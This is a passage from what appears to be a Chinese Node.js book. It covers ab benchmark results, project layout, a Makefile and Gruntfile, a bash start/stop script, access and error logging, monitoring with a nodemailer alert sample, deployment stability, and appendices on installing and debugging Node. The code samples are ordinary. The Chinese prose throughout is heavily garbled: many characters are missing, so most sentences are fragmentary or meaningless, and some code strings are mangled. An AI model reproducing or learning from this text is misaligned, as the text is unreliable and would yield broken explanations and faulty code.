Benchmarking localhost (be patient) Completed 5000 requests Completed 10000 requests Finished 14145 requests
Server Software: Server Hostname: localhost
Server Port: 8001
Document Path: / Document Length: 10240 bytes
Concurrency Level: 10 Time taken for tests: 3.010 seconds Complete requests: 14145 Failed requests: 0 Write errors: 0 Total transferred: 145905675 bytes HTML transferred: 144844800 bytes Requests per second: 4699.53 [#/sec](mean) Time per request: 2.128 [ms](mean) Time per request: 0.213 [ms] (mean, across all concurrent requests) Transfer rate: 47339.54 [Kbytes/sec] received
Connection Times (ms)
min mean[+/-sd] median max
Connect: 0 0 0.5 0 61
Processing: 0 2 5.8 1 215
Waiting: 0 2 5.8 1 215
Total: 1 2 5.8 2 215
Percentage of the requests served within a certain time (ms)
50 % 2
66 % 2
75 % 2
80 % 2
90 % 3
95 % 3
98 % 4
99 %5
100 %215 (longest request)
从测试可以到，QPS 从的 3857.60 了 4699.53，这个性能并没有与 CPU 的数量线性，这个问题我们不，它已经了我们的动实是能性能的。
10.2.4
，在实的能开发之前，我们要务量，以能开发后能实的在线务量。用量只有几个，天的 PV 只有几个，网开发几不要优就能。PV 上 10 甚至、，就要用性能测试是否能实务，不，就要用优服务能。
个页天的问量为 100。实务情，要问量大中在 10 个小时 10 以内，就是
QPS =PV/10h 100 的务问量为 QPS，于 27.7，服务要 27.7 个请才能务量。

## 10.3 总结

测试是应用者系统最要的质量。有测试实践的目，对的次都好。测试能目个部的性，也能在目过程中很好反质量。没有测试，就没有的走。
对于性能，在编过程中一定在部分性认，与实情有部分，性能测试能很好这。

## 10.4 参考资源

本章参考的资源如下：

- http://nodejs.org/docs/latest/api/assert.html
- http://visionmedia.github.com/mocha/
- https://github.com/visionmedia/should.js
- https://github.com/fent/node-muk
- https://github.com/alex-seville/blanket
- http://about.travis-ci.org/docs/
- https://github.com/JacksonTian/unittesting
- https://speakerdeck.com/felixge/faster-than-c-3

# 第 11 章 产品化

Node 相对于大多数 Web 技术还是年的，这着没有熟的应用系统可以接上使用，还于。反过，这也能开发者接触到多的，HTTP、程、服务，这些与他有技术并实质性的。对于 Node 开发者言，很多他语言走过的要开发者着 Node 性新践一遍。这并不是事，Node 接使开发者对于的可高。
目前，在国内大多数人都 Node 以实性质的使用，国外已经有的目 Node 应用在实的生产环境中，eBay 的数中、Linkedin 动应用的服务端。本-Node 产品过程中要的一些，这些实是性的，并 Node 有。于部分 Node 开发者可能从前端，为了 Node 生的，以加了。管因为熟悉 JavaScript，可以好上 Node，是事实上从到产品还有的要补。
在实的产品中，要很多编相关的工作以目的产品的，这些包括工程、、、部。只有这些务在续性，才目是活着的。

## 11.1 项目工程化

的工程，可以解为目的组织能。在上，就是的组织能。对于不的目，组织也有不。之外，还应有能个目起的灵性。
目的组织就作的，目的的几不可能，有、有的组织的生才会，才。
在目工程过程中，最本的几是目、工、编，下一解。
11.1.1
目前，要的目为 Web 应用应用。的应用 CommonJS 的包可，可 2。对于 Web 应用，组织有样，是只要一可。的 Web 应用都是以 MVC 为要的，余部分在这个上。下是我的 11 个 Web 应用目
\$ tree -L 2 . History.md //目动 INSTALL.md //安装 Makefile // Makefile 文件 benchmark // 基准测试 controllers //控制器 lib // 有模块化的文件目录 middlewares //中间件 package.json // 包描述文件目配置 proxy //数据代理目录类 MVC 中的 M test //测试目录 tools //工具目录 views //视图目录 routes.js // 路注表 dispatch.js //多进程理 README.md // 目文件 assets // 静态文件目录 assets.json //静态文件与 CDN 路径的文件 bin // 执行本 config // 配置目录 logs //日志目录 app.js // 工作进程
这个目能的分门到目中，中包的 MVC 定 CommonJS 定以一些自有定。熟一的 Web 应用（Express）还了工初始 Web 应用，为开发者了一个好的起。
在实的目中，还在 node_modules 这样一个目，这个目不用加入到本中。在部目时，我们过 npm installpackage.json 中的时，会自动生这个目。
11.1.2
有了源目，只是了一。要想能用上源，还要一定的作，这些作要有并、大小、包应用、编。次都工这些作，会下。为了源，工作工，工就是的。用作过工起后，后续只要的就能大部分工作了。
目前，在 Node 的应用中，的工还是牌的 make，它的是只在\*nix 作系统下有。为了实，Grunt 应生。Grunt 过 Node 写，Node 的能，实了很好的性。下要这个工。

1. Makefile
   Makefile 是*nix 系统下经的工。了 Windows 系统外，他系统几都能使用它。Makefile 的还有 Ruby 的 RakefileGemfile。Makefile 用管一些编相关的工作。以下为经的 3
   $ ./configure $ make $ make install
在这3中，有Makefile有关。在Web应用中，也会在Makefile中编写一些务目，
的并编、应用包、测试、目、。下为我的个Web目的Makefile
TESTS = $(shell ls -S `find test -type f -name "*.js" -print`) TESTTIMEOUT = 5000 MOCHA_OPTS = REPORTER = spec install: @$PYTHON=`which python2.6` NODE_ENV=test npm install
   test:
   @NODE_ENV=test ./node_modules/mocha/bin/mocha \ --reporter $(REPORTER) \  --timeout $(TIMEOUT) \ $(MOCHA_OPTS) \  $(TESTS)
   test-cov: @$(MAKE) test REPORTER=dot @$(MAKE) test MOCHA_OPTS='--require blanket' REPORTER=html-cov > coverage.html @$(MAKE) test MOCHA_OPTS='--require blanket' REPORTER=travis-cov 
reinstall: clean @$(MAKE) install
   clean: @rm -rf ./node_modules
   build: @./bin/combo views .
   .PHONY: test test-cov clean install reinstall
   这个 Makefile 测试、测试、目、make。Makefile 与续工发工起会开发者心。
2. Grunt
   Makefile 一的也就是问题了，为才有 ant、rake 工的。在 Node 生系统中，也有一工解决了 Makefile 的问题 Grunt。
   Grunt 用 Node 写，能时在 Windows*nix 下。GruntNPM 的包管，可以 Java 的 Maven 工，时它 Makefile 一样，能用的自动务工。它的与 Makefile 并不相 Makefile 托强大的 bash 编程，Grunt 托它的 11，它自用接用于的接入，的务由。
   Grunt 的心以 grunt-contrib-开，在 NPM 包管上可以到。Grunt 了 3 个分用于时、初始 grunt、grunt-init、grunt-cli。后个都可以作为工使用，时-g 可。
   make 一样，Grunt 也会在目目中一个 Gruntfile.js。于 Makefile 的务，在目下 grunt 会读，后解、务。下是个目的 Gruntfile.js
   module.exports = function(grunt) { grunt.loadNpmTasks('grunt-contrib-clean'); grunt.loadNpmTasks('grunt-contrib-concat'); grunt.loadNpmTasks("grunt-contrib-jshint"); grunt.loadNpmTasks('grunt-contrib-uglify'); grunt.loadNpmTasks('grunt-replace');
   // Project configuration
   grunt.initConfig({ pkg: grunt.file.readJSON('package.json'), jshint: {
   all: { src: ['Gruntfile.js', 'src/\*\*/*.js', 'test/\*_/_.js'], options: {
   jshintrc: "jshint.json" }
   } }, clean: ["lib"], concat: {
   htmlhint: { src: ['src/core.js', 'src/reporter.js', 'src/htmlparser.js', 'src/rules/*.js'], dest: 'lib/htmlhint.js'
   } }, uglify: {
   htmlhint: { options: { banner: "/_!\r\n _ HTMLHint v< = pkg.version %>\r\n _
   %
   https://github.com/yaniswang/HTMLHint\r\n _\r\n _ (c) 2013 Yanis Wang <yanis.wang@gmail.com>.\r\n _ MIT Licensed\r\n \*/\n", beautify: { ascii_only: true
   } }, files: {
   'lib/< =% pkg.name %>.js': ['< = concat.htmlhint.dest
   %%>'] }
   } }, replace: {
   htmlhint: { files: { 'lib/htmlhint.js':'lib/htmlhint.js'},
   options: {
   prefix: '@',
   variables: {
   'VERSION': '< = pkg.version %>'
   %
   }
   }
   }
   }
   });
   grunt.registerTask('dev', ['jshint', 'concat']);
   grunt.registerTask('default', ['jshint', 'clean', 'concat', 'uglify', 'replace']);
   };
   make 工 Grunt 有，是对于不熟悉 bash 编程的开发者，Grunt。
   11.1.3
   了好的目后，工程是有了一个不的开。也很有人一个有很多人过 JavaScript 开发应用的情景，在 JavaScript 应用场景多的情下，个一起一会很。多人相的，会不一问题。是否好的可性是最能质的。为统一好的编，有于的可读性，可性。目中的可性是目后本的要因，一不可性，后目的 bug 复都会大的本。在目一开始就定本的编，统一的。
   编的统一一有几实，一是的定，一是时的强。前者自，后者工。
   在 JSLintJSHint 工的下，在已经能很好了。一定了编的，可以生一。一些工者编能过对源，接开发者问题在。
   目前，我过为目创.jshintrc，Sublime Text 2 编在后可以实时自动
   ，并编中的问题在。
   关于编，可以 C，中有的。
   JavaScript 是一门过于灵活的语言，个应有自己的，使编能灵活，这对于工程是一个很好的。
   11.1.4
   立在的过程中。目前，开源社区大多过 GitHub 实托管。对于一些，也过 gitlab 开源工了内部的托管。这托管了实托管外，还强了 bug 的系统，并且用 git 的分，可以很好实。git 的分开发灵活，于分开发。开发者可以很从，后 11 能的开发，开发后，，发起并请可。图 11-1 为发起并请的程图。

图 11-1 发起并请的程图
要在请并的过程中，要的有能是否、编是否、测试是否有加。不，就要新，后，只有过之后，才应并。图 11-2 了的程图。

图 11-2 的程图
要一定的，一些可以自动的工作可以由工自动，编的。后的，还要人工认。管实会一定的，是质量的的好还是会产品的。
在并的过程中，一还会测试的环境，一都没有问题之后才会上线部。

## 11.2 部署流程

在开发、、并之后，才会入部程。管经过一系的人工测试的质量，也并不能接上线到生产环境中接，还要在测试环境中测试之后才入生产环境线上测试。
11.2.1
在实的目中，有个要，一是能的性，一是与数相关的。一个是的，会测试环境开发者测试人的动是否。之以要有的测试环境，是为了关因的。是对于一些能言，它的为是与数相关的，测试环境中的数在者大小上不能测试，要在一个发环境中测试。发环境与的测试环境的在于它的数为接线上实的数。
我们测试环境为 stage 环境，发环境为 pre-release 环境，实的生产环境为 product 环境，个部程图 11-3。

图 11-3 部程图
11.2.2
就的言，我们接在中 node file.js 以动应用。这对于开发中的应用言，时中程并问题。是对时的服务程言，这在个问题这会一个，次着的会开的程一并。为了能程续，我们可能会用到 nohup&以不程的
nohup node app.js &
动程很，是还有个要程程。工管的会，为，我们要一个脚本实应用的动、作。要这样的作，bash 脚本是最的。bash 脚本的内过与 Web 应用以定的实。这的定，实就是要解决程 ID 不的问题。没有定，我们要到应用对应的程，后用 kill 程。这要用 ps，相关下
\$ ps aux | grep node jacksontian 3618 0.0 0.0 2432768 592 s002 R+ 3:00PM 0:00.00 grep node jacksontian 3614 0.0 0.4 3054400 32612 s000 S+ 2:59PM 0:00.69 /usr/local/bin/node /Users/jacksontian/git/h5/app.js
后对应的 Node 程 kill 3614。这的定是，程在动时程 ID 写入到一个 pid 中，这个可以在一个定的下，应用的 run/app.pid。下是 pid 写入到中的
var fs = require('fs'); var path = require('path');
var pidfile = path.join(\_\_dirname, 'run/app.pid'); fs.writeFileSync(pidfile, process.pid);
脚本在应用时过 kill 程发 SIGTERM 信，程收到信时 app.pid，时程，相关下
process.on('SIGTERM', function () { if (fs.existsSync(pidfile)) {
fs.unlinkSync(pidfile); } process.exit(0);
});
下是一个的 bash 脚本，用于应用的动、作

```bash
#!/bin/sh DIR=`pwd` NODE=`which node` # get action ACTION=$1

# help

usage() { echo "Usage: ./appctl.sh {start|stop|restart}" exit 1;
}
get_pid() { if [ -f ./run/app.pid ]; then echo `cat ./run/app.pid` fi }

# start app start() { pid=`get_pid`

if [ ! -z $pid ]; then echo 'server is already running'
else $NODE $DIR/app.js 2>&1 & echo 'server is running'
fi }

# stop app

stop() { pid=`get_pid` if [ -z $pid ]; then
echo 'server not running'
else echo "server is stopping ..." kill -15 $pid  echo "server stopped !"
fi }
restart() { stop sleep 0.5 echo ===== start
}
case "$ACTION" in start)
start ;; stop)
stop ;; restart)
restart ;; \*)
usage ;; esac
```

在部的过程中，只要这个 bash 脚本可，工管程
./appctl.sh start ./appctl.sh stop ./appctl.sh restart
这个脚本的心就是 run/app.pid 作的。要程 ID，只要读可。

## 11.3 性能

Node 产品的性能与多因相关，这我们到 Web 应用中，只一些的性能的。对于 Web 应用言，最接有的过于动分、多程、分，中的几个分下。
做一的事。的工做的事情。。分。之外，也能很大的性能。
11.3.1
在的 Web 应用中，Node 管也能过中实服务，是 Node 的能并不。图、脚本、样多都到的服务上，Node 只动请可。这个过程可以用 Nginx 者的 CDN。图 11-4 为动分的图。

图 11-4 动分图
动请请分后，服务可以在动服务，的 CDN 会与用可能，时能有高的机。请分后，对请使用不的多个还能不要的 Cookie 对下线程数的。
动请分只是最的分，也实。事实上还有复杂的情，一个网页中时在动数内，在 Node 中内发至客端时要到 Buffer 的，是对于内言的，只要 Buffer 可。接 Buffer 可以很大程上性能，这在 6 中已过。是能在动内中动内内分，还能一性能，这程上的也没有性，要多。
11.3.2
性能实不多只有个经，一是服务的，是不要的。前者的性能在海量量前有，后者能在问量大时收多。不要的，应用场景最多的就是。
管 I/O 在 CPU 时的时为，是在的下，能 I/O 的时。不管是 I/O 还是 I/O，不要的这好，性能是的。
今，RedisMemcached 几是 Web 应用的。你的产品要应对大的量，用并应用好它，是系统性能的关。
11.3.3
在 9 中，我们已经了多程。过多程，不仅可以分用多 CPU，是可以立机 Node 程加，以 Web 应用续服务。由于 Node 是过自有 HTTP 服务的，不像大多数服务端技术样有有的 Web，以要开发者自己多程的管。不过好在已经有 cluster，在社区也有 pm、forever、pm2 这样的用于程管，这不开。
11.3.4
了动分外，一个为要的分是读写分，这要对数言。就数言，读的高于写入的。些数在写入时为了数一性，会作，这时会到读的。些系统为了性能，会数的读写分，数从，这样读数作不到写入的，了性能的。
外，还有他多用以系统性能，以应对海量的请，这不一一开。

## 11.4 日志

在实的目中，开发只是个入的一小部分。应用系统上线起时，问题有可能会接。者，有一。多的编写，一些问题是可能在个不定的时候。这情下，与 bug 复它，不立的机，就是实这机的关。在的系统中，的最能还问题场。过定问题是一本小的。这、量的实，也。
11.4.1
问一用个客端对应用的问。在 Web 应用中，要 HTTP 请中的关数。一的 Web 服务都实了问的能，只要的可用。在用 NginxApache 反时，可以用这些已有的问的。在 Node 开发的 Web 应用中，也可以自实问的。
中 Connect 在多中中了一个中，过它可以关数一定到中。下是 Connect 的一
var app = connect();
//录访问日志
connect.logger.format('home', ':remote-addr :response-time - [:date] ":method :url
HTTP/:http-version" :status :res[content-length] ":referrer" ":user-agent" :res[content-length]');
app.use(connect.logger({
format: 'home',
stream: fs.createWriteStream(\_\_dirname + '/logs/access.log')
}));
这的数有 remote-addrresponse-time，这些数已经用分 Web 应用的用分情、服务端的应时、应客端。这些数于数，能反过网。
从上的中可以，数是以:token 的的。Connect 了 token()用对应实数，下是:status 的最
exports.token('status', function(req, res){
return res.statusCode; });
Connect 在最应前会实数 token()，后写入到中。在实的应用场景中，可以入一些用信，用以一些数，个用过问个页，他有可能是一个机人，在网页中的数。分，IP，可以实定绝服务。
11.4.2
用些外产生的。过的，开发者可以信定 bug 的，以复问题。有的分，Node 中的 console 对就实了这几分，下。
. console.log。
. console.info 信。
. console.warn 信。
. console.error 信。

console 在实时，log 与 info 都信 process.stdout，warn 与 error 信到 process.stderr，infoerror 分是 logwarn 的。下为它们的实
Console.prototype.log = function() { this.\_stdout.write(util.format.apply(this, arguments) + '\n'); };
Console.prototype.info = Console.prototype.log;
Console.prototype.warn = function() { this.\_stderr.write(util.format.apply(this, arguments) + '\n'); };
Console.prototype.error = Console.prototype.warn;
console 对上有一个 Console 性，它是 console 对的数。这个数，我们可以实自己的对，相关下
var info = fs.createWriteStream(logdir + '/info.log', {flags: 'a', mode: '0666'}); var error = fs.createWriteStream(logdir + '/error.log', {flags: 'a', mode: '0666'});
var logger = new console.Console(info, error);
分用它的 API，内就能自写入到对应的中，相关下
logger.log('Hello world!'); logger.error('segment fault');
有了信的 API 后，开发者要关心的是要小心一个。在 4 中，我们到用中数的外部的问题，也到了 API 编写的，个开发者应 API 内部发生的作为一个实数。对于数中产生的，可以不用过问，的 uncaughtException 事可。
在次的 API 用中，是用还是立过，这是一个要的问题。就的 API 编写言，量不要，不要过 try/catch，后起不外部用者。这对于 API 的言，为要。事实上，是服务于务的。我的是量由最上的用者，用中用中的只要上的用可。
中用这样写
exports.find = function (id, callback) { // 准 SQL db.query(sql, function (err, rows) {
if (err) {
return callback(err); } //处理结 var data = rows.sort(); callback(null, data);
}); };
上 API 对下 API 的不要做，接写可，下
exports.find = function (id, callback) { // 准 SQL db.query(sql, callback);
};
是对于最上的务，不能下过的，要，以，时应对用友好的，相关下
exports.index = function (req, res) { proxy.find(id, function (err, rows) {
if (err) { logger.error(err); res.writeHead(500); res.end('Error'); return;
} res.writeHead(200); res.end(rows);
}); };
只是过以上，它对的并不大，因为有些的要的数还场，以最好在时有好的的的数。为可以一个 format()信，的下
var format = function (msg) {
var ret = '';
if (!msg) {
return ret;
}
var date = moment();
var time = date.format('YYYY-MM-DD HH:mm:ss.SSS');
if (msg instanceof Error) {
var err = {
name: msg.name,
data: msg.data
};
err.stack = msg.stack;
ret =%% %s: s\nHost: %s\nData: %j %
util.format(' s \n s\n\n',
time,
err.name,
err.stack,
os.hostname(),
err.data,
time
);
console.log(ret);
} else {
ret = time + ' ' + util.format.apply(util, arguments) + '\n';
}
return ret;
};
为，我们在时可以用时的数，后下，下
var input = '{error: format}';
try {
JSON.parse(input);
} catch (ex) {
ex.data = input;
logger.error(format(ex));
}
这样在中就可以到发生时的入数，后定 bug 解决问题就是到的事了。下为
2013-06-12 17:18:19.776 SyntaxError: SyntaxError: Unexpected token e
at Object.parse (native)
at Object.<anonymous> (/Users/jacksontian/git/diveintonode/examples/12/logger.js:53:8)
at Module.\_compile (module.js:456:26)
at Object.Module.\_extensions..js (module.js:474:10)
at Module.load (module.js:356:32)
at Function.Module.\_load (module.js:312:12)
at Function.Module.runMain (module.js:497:10)
at startup (node.js:119:16)
at node.js:901:3
Host: Jackson.local Data: "{error: format}" 2013-06-12 17:18:19.776
对于的，Node 了机以程接，是发生的程也不能继续在线上服务了，因为可能有内的产生。优程在 9 中已过，一中的多是用 console.log()问题的，在实的产品中，要的。过程上，不。
11.4.3
有的开发者对可能不了解，会一些写入到数中。数好的在于它是数，可以接编写 SQL 语分，要加工之后才能分。
是与数写入在性能上于个，数在写入过程中要经一系，、作。写是接数写到上。为，有大量的问，可能会在写入作大量的，数的于生产，内。相之下，写是量的，分这个分开是好的。可以在线写，分可以一些工到数中，过线分的反。
11.4.4
线上务可能问量大，产生的也可能是大量的，上只是分开在个中，过多时也不接。为，产生的分是一个不的。的写入一都是托在可写上的。对于 Console 对，它的内部性\_stdout_stderr 就是我们入的个入对的。在的过程中，我们可以对应的可写对，为可以一个定时用于发生时，对的个入对可。这不开实。
11.4.5
相对言是为的事情，是一好这个过程，有问题产生时可以解决。很多开发者在开发过程中不（没），到线上产生问题时会脚。好的可以为系统的，问题时，我们都能做到心中有数。

## 11.5 监控报警

部好程，好之后，应用就可以自了。实上，这时候的应用初生的，学会了走，不管，就它到大上的人中。就像大的 11 要有一个人一，应用也应有一个系统。对于走到大上的，，要时起。应用了，也要过时发，后复它。
应用的要有，一是务的，一是的。要过定时样。之外，还要对的信上，一大的动，就要发开发者。为了好开发者使用，到的信一还要过数可的反，以。
11.5.1
的要目的是为了一些要样下，一这些发生大，可以系统问题反到人。的可以很，也可以只要的。

1.

务的要在上，做了的之后，应用起是个问题。过的动，新的数量反。些与的个系统相关，的个多能反系统的。
了的外，对于问的也能实的务 QPS。QPS 的能务在时上的分。
外，从问中也能实 PVUV 的。QPS 一样，过对 PV/UV 的，可以很好应用的使用者们的习、问高。

2.

应时也是一个要的。一系统的个系统者性能，会系统的应时。应时可以在 Nginx 一的反上，也可以过应用自产生的问。的系统应时应是动小的、续的。

3.

应时都能好到系统的，是它们的前是系统是的，以程是前者为要的务。程一是作系统中的应用程数，对于用多程的 Web 应用，就要工作程的数量，于，就应发。

4.

要是的用量。由于写的，用。一不用，会发系统的问题。的使用量一个上，一用量过，服务的管者就应了。

5.

对于 Node 言，一内，不是的。服务的内使用，可以应用中是否在内的。内只不，定在内问题。的内使用应是有有，在问量大的时候上，在问量的时候，用量也之。
程中在内，一时没有解决，有一可以解决这。这应用于多程的服务，个工作程定服务多次请，到请数之后程就不服务新的接，程动新的工作程服务客，的程有接开后就。这样使在内的，也能有内的。这于问题，只解决了问题的，不推荐使用。
言之，内并时是系统的好。内，也能到是的些动的问题。

6. CPU
   服务的 CPU 用也是不可的，CPU 的使用分为用、内、IOWait。用 CPU 使用高，服务上的应用要大量的 CPU 开内 CPU 使用高，服务大量时程者系统用 IOWait 使用反应的是 CPUI/O 作。
   CPU 的使用中，用小于 70%、内小于 35%且小于 70%时，于。CPU 用情，可以分应用程序在实务中的。能很好。
7. CPU load
   CPU loadCPU，它用作系统前的程，可以解为 CPU 在时内在使用使用 CPU 的务数。它有 3 个，1 分的、5 分的、15 分的。CPU load 过高程数量过多，这在 Node 中可能在用程反复动新的程。可以外产生。
8. I/O
   I/O 的要是 I/O。反应的是上的读写情，对于 Node 编写的应用，要是网服务，是不可能 I/O 过高的情，大多数的 I/O 自于数。不管 Node 程是否与数他 I/O 的应用相的服务，我们都应以一。
9.

网量的优没有上目高，还是要对量并上。应用到用的，量时也能过数到网的是否有。一量过，开发者就应量的因。对于，应是否加为多用服务。
网量的个要是入量量。

10.

了这些性要测的外，应用还应一机反自的信，外部会续性用应用的反接它的。
最的反就是应一个时，时是否可
app.use('/status', function (req, res) {
res.writeHead(200);
res.end(new Date());
});
一些的应是应用的的，数接是否、是否。

11. DNS
    DNS 是网应用的，在实的对外服务产品中，多数都对有。DNS 产品大的事并不。由于 DNS 服务是定的，人，一，就可能是前的。对于产品的定性，DNS 也要加入。目前国内有一些的 DNS 服务，DNSPod，可以过这些服务，自己的在线应用。
    11.5.2
    系统的是系统，有没有能，也是时反开发者的。今的已经能多样，最的、IM 在线工作，信在线。
    . 系统由 Node 编写，可以用 nodemailer 实的发。下为一个发
    var nodemailer = require("nodemailer");
    //建 SMTP 传输接
    var smtpTransport = nodemailer.createTransport("SMTP", { service: "Gmail", auth: {
    user: "gmail.user@gmail.com", pass: "userpass" } });
    //件
    var mailOptions = { from: "Fred Foo . <foo@bar.com>", // 发件件 to: "bar@bar.com, baz@bar.com", //收件件列表 subject: "Hello .", //题 text: "Hello world .", //纯文本内容 html: "<b>Hello world .</b>" // HTML 内容
    }
    //发件 smtpTransport.sendMail(mailOptions, function (err, response) { if (err) { console.log(err); } else { console.log("Message sent: " + response.message); } });
    . 一些信服务信接入服务，可以在系统中接入服务时，一线上到的时，就信发应用相关的人。
    11.5.3
    我们发为了应用的定性，实不不入了一个大的系统。系统自的定性对应用要，这的，不能心，，是有系统不没有。
    系统自己的定性是外一个题，本不继续开。

## 11.6 稳定性

关于应用的定性，实在部分中都有，在 49 这中有，这从程多程的了定性。一服务不了务的（有的），这就要 Node 多程的部到多机中。这样机，也能有余机为用服务。之外，为了能好服务用，绝大多数都会在机以因为的网问题。为了好的定性，的就是多程、多机、多机，这样的分在在的网并不。
. 多机部应用的好是能用多的源，为多的请服务。时能在有时，继续服务用请，系统的高可用性。是一分，就要、享数一性问题。在机中请分发到多个程上一样，部多机也要请
分个机，这要在机的上，可能是实，也可能是实，反。图 11-5 为的图。

图 11-5 图
对于享数一性，它们与多程的问题是一的，可 9，不多。
. 多机部是多机部高次的部，目的是为了解决用问的问题。在，机与机之可以为。由于机与机之的网复杂，要一统，不开。
. 在多机多机的部下，分过的，一机者一个机了服务，都能有余的服务接新的务。在这个机下，我们至要 4 服务这个定的服务，图 11-6。

图 11-6 服务图
要的是，今技术已经熟，在多服务部中，要量多个服务在相的实机上。因为一实机，多服务一起服务。
应用自的部问题到解决后，还要的是应用的服务的，的数、服务。

## 11.7 异构共存

在技术的产品的，一门新技术应用在生产环境中就与已有的系统者服务能否。为了应用一新技术已有的有技术推，并不是一个的。一门新的语言者新的技术在推广应用的过程中都要这样的问题。对于 Node 言，我在本书中了它的多。可以，它并一个不入的新事，它于 C/C++之上，以 JavaScript 为用语言，以好的事驱动网的，的都能从作系统到它的起源。
在应用 Node 的过程中，一部分是在新的目中应用，一部分是已有系统过 Node 性能。几没有已有系统推用 Node 的。
关于在新目中应用 Node，。对于已有系统，NodeC/C++网，已经能与这个上大多数的系统。在于能服务的产品，都是有
的。几是解决系统最的。只要有的，语言就能过网与之。MySQL 数，由于有的网，以可以过样的编程语言用。，过 Node 编写对应的客端驱动也并不是事。图 11-7 为编程语言与服务之过网用的图。

图 11-7 编程语言与服务过网用的图
对于一系统，可能并 TCP 的网，是 RESTful 的服务接。者的不在于一个是 HTTP，于应用一个是 TCP，于。次不，性能会。TCP 会立的接，甚至接，HTTP 可能接，在性能上在。TCP 要客端驱动，HTTP 本上有的客端。
之，在应用 Node 的过程中，不在为了用它推已有的情。Node 能过与已有的系统很好。Node 用于系统的开发者要的是已有的系统是否好的服务，是否多端，是否多语言用。

## 11.8 总结

一言，决定用一技术产品开发时，只有最是与这门技术相关的。着时的，要解决的已经不是的问题了，一门技术只能在一定上发它的优势。用 Node 也是一样，着开发的、的多，我们到在产品的要解决的问题是大部分技术都要解决的问题。我们读者能 Node 入到新的上，使它应产品，在产品中发大的优势。

## 11.9 参考资源

本的源为https://github.com/andris9/Nodemailer。
Node  
G

# 附录 A 安装 Node

Node 的开发环境分，只要一个时的本编就可以开始开发了，分量。
在经的发友时（v0.2 到 v0.4），Node 要一定的才能在中，并且在 Windows 下。从 v0.6 开始，Node 用了 GYP 目生工，时用 libuv 作为，实了\*nix 与 Windows，这在 2 中已过，不深。至时候起，Node 了在 Windows 下过 Cygwin 的。今 Node 在个本发时，会编好个下的本，接可，编。Node 的页http://nodejs.org会你的作系统不的接用下，用只Install可。
在 Node 的过程中，实上还会上 NPM 工。对于 NPM 的作用，2 也有。在 Nodev0.6.3 之前，NPM 工的是与 Node 分的，要外。在 v0.6.3 时，Node 中就开始了 NPM 的。在不之后，NPM 的作者 Isaac Z. Schlueter 从 Ryan Dahl 中接过 Node 门人的，Node 的问题复本发。
下个下的，只是上有不。

## A.1 Windows 系统下的 Node 安装

对于 Windows 用，32 系统会到http://nodejs.org/dist/<version>/node-<version>-x86.msi 这样一个，中 version 是的本，64 系统会到http://nodejs.org/dist/ <version>/x64/node-<version>-x64.msi。下.msi 后，接它，时-的一 Next 可个程。图 A-1 为 Node 在 Windows 系统下的-。
后，开，node -v 是否。不外，会到前本的本。样也可以 npm -vNPM 工是否 Node。
，这的<version>是一个 v{major}.{minor}.{revision}的，v0. 10.12。

图 A-1 Node 在 Windows 系统下的

## A.2 Mac 系统下 Node 的安装

Mac 系统下的用与 Windows 用不的是会到.pkg 的包，接也与本相关http://nodejs.org/dist/<version>/node-<version>.pkg。
下后，开.pkg 包，也会 Windows 用样到一个，图 A-2。

图 A-2 Mac 系统下 Node 的
继续并接可后，着可。
后，在 node -vnpm -v 可。下是我时的环境
$ node -v v0.8.14 $ npm -v 1.1.65

## A.3 Linux 系统下 Node 的安装

对于 Linux 系统下的用，推荐过源。开 Node 页，会到源接http://nodejs.org/dist/<version>/node-<version>.tar.gz。你可以过 wgetcurl 工下。要的是，编 Node 时要的几个环境下。
. Python 2.6Python 2.7Node 不 Python3.0。要因在于 GYP 目工是用 Python 开发的，这 Python 2.7，因为 node-gyp 要 Python 2.7 才能使用。
. Node 自有部分过 C/C++编写，以要 GCCG++编。

. make 使用工的 3.81 本新的本。
对于不的 Linux 发，可以过自的工（apt-getyum）。下是用源
的过程
//解压源码包$ tar zxvf node-<version>.tar.gz //进入目录$ cd node-<version> //环境配置$ ./configure //配置结{ 'target_defaults': { 'cflags': [], 
'default_configuration': 'Release', 'defines': [], 'include_dirs': [], 'libraries': []}, 
'variables': { 'clang': 1, 'host_arch': 'x64', 'node_install_npm': 'true', 'node_prefix': '', 'node_shared_cares': 'false', 'node_shared_http_parser': 'false', 'node_shared_libuv': 'false', 'node_shared_openssl': 'false', 'node_shared_v8': 'false', 'node_shared_zlib': 'false', 'node_tag': '', 'node_unsafe_optimizations': 0, 'node_use_dtrace': 'true', 'node_use_etw': 'false', 'node_use_openssl': 'true', 'node_use_perfctr': 'false', 'python': '/usr/bin/python', 'target_arch': 'x64', 
'v8_enable_gdbjit': 0, 'v8_no_strict_aliasing': 1, 'v8_use_snapshot': 'true'}} 
creating ./config.gypi creating ./config.mk 
Node用GYP工目。./configure之后，了到以上外，还会在目
下生config.gypiconfig.mk。make后，这个Node的编。
编的过程是一个相对的时，最会在out/Release目下到node。sudo make 
install会node的相关到/usr/local下的libbin目下
$ make $ [sudo] make install 
node -vnpm –v，可以是否
$ node -v v0.8.14 $ npm -v 1.1.65 
事实上，这些作在Mac系统下也一样有。你是一个喜欢的人，可以试从Node的git中到最新的源编，以最新的能
$ git clone https://github.com/joyent/node.git \$ cd node
git tag，你会到有以的（tag）。到最新的，git checkout <version>到上编可。

## A.4 总结

在 Node 后，可以试着用自己喜欢的本编的经为 example.js，下
var http = require('http');
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}).listen(1337, '127.0.0.1'); console.log('Server running at http://127.0.0.1:1337/');
后 node example.js，是否可以到下
Server running at http://127.0.0.1:1337/
用试着开这个，是否到 Hello World 的。可以到这个，喜你了。

## A.5 参考资源

本的源为https://github.com/joyent/node/wiki/Installation Installation。
Node

## 附录 B 调试 Node

JavaScript 作为 Node 的要编程语言。在大多数的脚本语言中，试是一的事情，JavaScript 也不外。在 Firefox 的 Firebug 之前，的 JavaScript 试是在中编写 alert()，这的试之前在了很。对于 Node 言，试的不会像 Web 开发。这会 Node 开发中要的几试。

## B.1 Debugger

Node 的试接于 V8。V8 了的试 API，使可以从程内部试。时还了于 API 的 TCP 试，使过试，可以从程外试。Node 内了试的客端，以在动时上 debug 数就可以实对 JavaScript 的试。
在试前，要过 debugger;语在中，这样在时会中。以下为
// myscript.js x = 5; setTimeout(function () {
debugger;
console.log("world"); }, 1000); console.log("hello");
上时，在中加入 debug。加 debug 在中后，Node 会开试能，内
的客端会与 V8 立接。下的为
\$ node debug examples/B/myscript.js < debugger listening on port 5858 connecting... ok break in examples/B/myscript.js:2 1 // myscript.js
2 x = 5; 3 setTimeout(function () { 4 debugger;
debug>
在到 debugger;语后，中了，并入，入后
后续作。
